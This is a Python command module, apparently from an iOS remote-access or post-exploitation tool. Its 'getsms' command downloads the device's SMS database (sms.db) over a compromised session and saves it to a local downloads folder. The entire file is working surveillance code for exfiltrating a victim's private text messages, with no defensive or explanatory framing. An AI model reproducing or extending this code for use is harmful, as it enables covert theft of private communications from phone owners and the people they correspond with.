import json
import os
import modules.helper as h

class command:
	def __init__(self):
		self.name = "getsms"
		self.description = "Download SMS data."

	def run(self,session,cmd_data):
		file_name = "sms.db"
		h.info_general("Downloading {0}".format(file_name))
		data = session.download_file('/var/mobile/Library/SMS/'+file_name)
		if data:
			# save to downloads
			h.info_general("Saving {0}".format(file_name))
			f = open(os.path.join('downloads',file_name),'w')
			f.write(data)
			f.close()
			h.info_general("Saved to downloads/{0}".format(file_name))
